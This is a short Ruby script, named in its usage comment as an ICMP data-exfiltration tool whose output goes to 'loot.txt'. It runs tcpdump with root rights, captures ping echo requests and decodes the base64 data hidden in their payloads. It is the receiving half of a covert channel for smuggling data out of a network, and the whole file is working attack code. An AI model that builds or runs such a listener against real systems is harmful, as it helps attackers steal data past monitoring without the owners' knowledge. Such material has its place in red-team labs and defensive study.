#
# USAGE
# sudo ruby ./tcpdump_icmp-data-exfiltration.rb > loot.txt
# [CTRL + c]
#

require('base64')

INTERFACE = 'lo'

begin
    IO.popen(
        [
            'tcpdump',
            '-A',
            "--interface=\"#{INTERFACE}\"",
            '-l',
            '-n',
            '-q',
            '--snapshot-length=0',
            '-t',
            '"icmp[icmptype] == 8"'
        ].join(' '),
        'r+'
    ) do |io|
        io.sync = true
        while (line = io.gets)
            if (!line.include?('ICMP echo request'))
                line_scan = line.scan(/[a-zA-Z0-9=]*/)
                line_scan.each do |data|
                    if (data.size == 16)
                        decode64_data = Base64.decode64(data)
                        print(decode64_data)
                    end
                end
            end
        end
    end
rescue Interrupt
end
